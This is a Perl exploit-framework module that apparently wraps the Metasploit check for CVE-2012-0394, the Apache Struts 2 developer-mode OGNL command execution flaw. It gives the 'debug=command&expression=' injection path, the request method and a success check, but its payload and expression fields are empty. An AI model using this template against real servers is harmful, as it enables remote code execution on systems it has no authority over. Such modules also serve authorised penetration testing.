package STRUTS::MSF::StrutsDevMode;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "StrutsDevMode";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2012-0394",
  DESCRIPTION => "

        This module exploits a remote command execution vulnerability in Apache

        Struts 2. The problem exists on applications running in developer mode,

        where the DebuggingInterceptor allows evaluation and execution of OGNL

        expressions, which allows remote attackers to execute arbitrary Java

        code. This module has been tested successfully on Struts 2.3.16, Tomcat

        7 and Ubuntu 10.04.

      ",
  METHOD => "GET",
  MSF_MODULE => "struts_dev_mode",
  OSVDB => 78276,
  PATH => "debug=command&expression=__EXPRESSION__&",
  REFERENCES => [
    "https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20120104-0_Apache_Struts2_Multiple_Critical_Vulnerabilities.txt",
  ],
  TITLE => "Apache Struts 2 Developer Mode OGNL Execution",
  VARIABLES => {
    'EXPRESSION' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'MULTI',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
